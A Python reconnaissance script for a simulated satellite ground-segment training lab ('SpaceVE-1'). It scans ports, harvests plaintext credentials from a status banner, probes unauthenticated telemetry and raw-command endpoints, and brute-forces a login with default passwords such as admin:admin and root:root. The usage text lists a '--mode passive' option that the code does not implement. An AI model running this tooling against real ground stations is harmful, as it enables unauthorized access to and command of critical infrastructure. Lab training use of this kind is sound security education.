#!/usr/bin/env python3
"""
ground_station_scanner.py — SpaceVE-1 Ground Segment Recon Tool
SpaceVE-1 Lab Attack Tool

Performs passive and active reconnaissance against the SpaceVE-1
ground segment (MOC and ground station) to enumerate:
  - Open ports and services
  - Exposed credentials (ground station status banner)
  - Unauthenticated API endpoints
  - Default credentials on web interface
  - Session management weaknesses
  - Telemetry data accessible without auth

This models pre-attack recon from a position on the 192.168.60.0/24 network.
In real incidents (Viasat KA-SAT, 2022), attackers on the management
network could reach ground station infrastructure directly.

Usage:
  python3 ground_station_scanner.py
  python3 ground_station_scanner.py --target moc
  python3 ground_station_scanner.py --target gs
  python3 ground_station_scanner.py --target all
  python3 ground_station_scanner.py --mode passive

Common Beginner Mistakes:
  - Scanning satellite UDP port from outside the spacelab network won't work
  - The /api/telemetry endpoint returns {} if satellite hasn't sent data yet
  - Ground station status port 5900 only holds connection open briefly
"""

import argparse
import json
import socket
import sys

import requests

MOC_IP = "192.168.60.11"
MOC_PORT = 8080
GS_IP = "192.168.60.10"
GS_STATUS_PORT = 5900
GS_CMD_PORT = 4820
SATELLITE_IP = "192.168.60.100"

CREDENTIALS_TO_TRY = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("operator", "operator"),
    ("user", "user"),
    ("root", "root"),
]


def banner(title: str):
    print(f"\n  [{title}]")
    print(f"  {'=' * (len(title) + 2)}")


def scan_tcp_port(host: str, port: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def grab_tcp_banner(host: str, port: int) -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        data = sock.recv(1024)
        sock.close()
        return data.decode("utf-8", errors="replace").strip()
    except Exception as e:
        return f"(error: {e})"


def scan_moc():
    banner("MOC Reconnaissance")

    # Port check
    open_moc = scan_tcp_port(MOC_IP, MOC_PORT)
    print(f"  Port {MOC_IP}:{MOC_PORT}/tcp: {'OPEN' if open_moc else 'CLOSED'}")
    if not open_moc:
        print("  MOC not reachable. Check: cd lab && docker compose up -d")
        return

    # Health endpoint (no auth)
    try:
        r = requests.get(f"http://{MOC_IP}:{MOC_PORT}/health", timeout=3)
        print(f"  GET /health: {r.status_code} — {r.text[:100]}")
    except Exception as e:
        print(f"  GET /health: error ({e})")

    # Unauthenticated telemetry
    try:
        r = requests.get(f"http://{MOC_IP}:{MOC_PORT}/api/telemetry", timeout=3)
        print(f"  GET /api/telemetry (NO AUTH): {r.status_code}")
        if r.status_code == 200:
            tlm = r.json()
            print(f"    satellite_id: {tlm.get('satellite_id', '?')}")
            print(f"    uptime_s: {tlm.get('uptime_s', '?')}")
            print(f"    camera_enabled: {tlm.get('camera_enabled', '?')}")
            print(f"    downlink_enabled: {tlm.get('downlink_enabled', '?')}")
            if tlm.get("downlink_enabled"):
                mp = tlm.get("mission_plan", {})
                if mp:
                    print(f"    mission_plan (SENSITIVE): {json.dumps(mp)}")
    except Exception as e:
        print(f"  GET /api/telemetry: error ({e})")

    # Raw command API (no auth)
    try:
        r = requests.post(
            f"http://{MOC_IP}:{MOC_PORT}/api/command/raw",
            json={"hex": "1a00c0000001 00ff".replace(" ", ""), "note": "recon_probe"},
            timeout=3
        )
        print(f"  POST /api/command/raw (NO AUTH): {r.status_code}")
        if r.status_code in (200, 400):
            print(f"    Response: {r.text[:150]}")
            if r.status_code == 200:
                print(f"    *** UNAUTHENTICATED COMMAND INJECTION CONFIRMED ***")
    except Exception as e:
        print(f"  POST /api/command/raw: error ({e})")

    # Credential brute force
    print(f"\n  Credential enumeration (POST /login):")
    session = requests.Session()
    for user, pwd in CREDENTIALS_TO_TRY:
        try:
            r = session.post(
                f"http://{MOC_IP}:{MOC_PORT}/login",
                data={"username": user, "password": pwd},
                allow_redirects=True,
                timeout=3
            )
            if "DASHBOARD" in r.text or "telemetry" in r.text.lower():
                print(f"    {user}:{pwd} — VALID (got dashboard)")
            else:
                print(f"    {user}:{pwd} — invalid")
        except Exception as e:
            print(f"    {user}:{pwd} — error ({e})")

    print()


def scan_gs():
    banner("Ground Station Reconnaissance")

    # Command gateway port
    open_cmd = scan_tcp_port(GS_IP, GS_CMD_PORT)
    print(f"  Port {GS_IP}:{GS_CMD_PORT}/tcp (cmd gateway): {'OPEN' if open_cmd else 'CLOSED'}")

    # Status port — leaks credentials
    open_status = scan_tcp_port(GS_IP, GS_STATUS_PORT)
    print(f"  Port {GS_IP}:{GS_STATUS_PORT}/tcp (status):     {'OPEN' if open_status else 'CLOSED'}")

    if open_status:
        banner_text = grab_tcp_banner(GS_IP, GS_STATUS_PORT)
        print(f"\n  Status banner (credentials in plaintext):")
        for line in banner_text.splitlines():
            print(f"    {line}")
        if "Auth:" in banner_text or "operator" in banner_text.lower():
            print("\n  *** CREDENTIALS EXPOSED IN PLAINTEXT ***")


def scan_satellite():
    banner("Satellite Port Recon (passive)")
    print(f"  {SATELLITE_IP}:1234/udp — CCSDS command port (no auth)")
    print(f"  Cannot be confirmed via simple TCP probe (UDP — use ccsds_packet_forge.py)")
    print(f"  Confirmed by: cFS CI_LAB default config, no auth in SpaceVE-1 cfs_stub.py")


def main():
    p = argparse.ArgumentParser(description="SpaceVE-1 ground segment recon")
    p.add_argument("--target", choices=["moc", "gs", "satellite", "all"], default="all")
    args = p.parse_args()

    print("\n  SpaceVE-1 Ground Segment Scanner")
    print("  ==================================")

    if args.target in ("moc", "all"):
        scan_moc()
    if args.target in ("gs", "all"):
        scan_gs()
    if args.target in ("satellite", "all"):
        scan_satellite()

    print("\n  Scan complete.\n")


if __name__ == "__main__":
    main()
